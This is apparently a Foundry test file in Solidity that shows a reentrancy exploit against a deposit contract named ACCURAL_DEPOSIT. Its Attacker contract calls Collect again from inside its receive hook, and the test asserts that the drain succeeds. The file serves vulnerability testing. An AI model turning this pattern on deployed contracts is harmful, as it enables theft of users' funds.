
// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {ACCURAL_DEPOSIT,LogFile} from "../src/ACCURAL_DEPOSIT.sol";

contract TestReentrancyACCURAL_DEPOSIT is Test {
    ACCURAL_DEPOSIT public _contractUnderTest;
    LogFile public _logFile;
    
    Attacker public _attacker;

    function setUp() public {
        _logFile = new LogFile();
        _contractUnderTest = new ACCURAL_DEPOSIT();
        _contractUnderTest.SetLogFile(address(_logFile));
        _contractUnderTest.SetMinSum(1 wei);
        
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal >= 1 wei && attackVal <= type(uint128).max);
        vm.assume(attackVal * 2 <= type(uint128).max);
        
        vm.deal(address(_contractUnderTest), attackVal * 2);
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        _attacker.setupAttack{value: attackVal * 2}(attackVal);
        _attacker.attack(attackVal);

        assertTrue(_attacker.exploitSucceeded(), "Reentrancy attack failed: exploitSucceeded flag was not set.");
    }

    receive() external payable {}
}

contract Attacker {
    ACCURAL_DEPOSIT public victim;
    uint256 public attackCallCount;
    bool public exploitSucceeded;
    uint256 public attackAmount;

    constructor(address victimAddress) { 
        victim = ACCURAL_DEPOSIT(payable(victimAddress));
    }

    function setupAttack(uint256 val) public payable {
        attackCallCount = 0;
        exploitSucceeded = false;
        attackAmount = val;
        
        victim.Deposit{value: msg.value}();
    }

    function attack(uint256 val) public {
        uint256 initialBalance = address(this).balance;
        
        victim.Collect(val);
        
        if (attackCallCount >= 2 && address(this).balance >= initialBalance + (val * 2)) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        if (attackCallCount < 2) {
            attackCallCount++;
            if (attackCallCount == 1) {
                victim.Collect(attackAmount);
            }
        }
    }
}
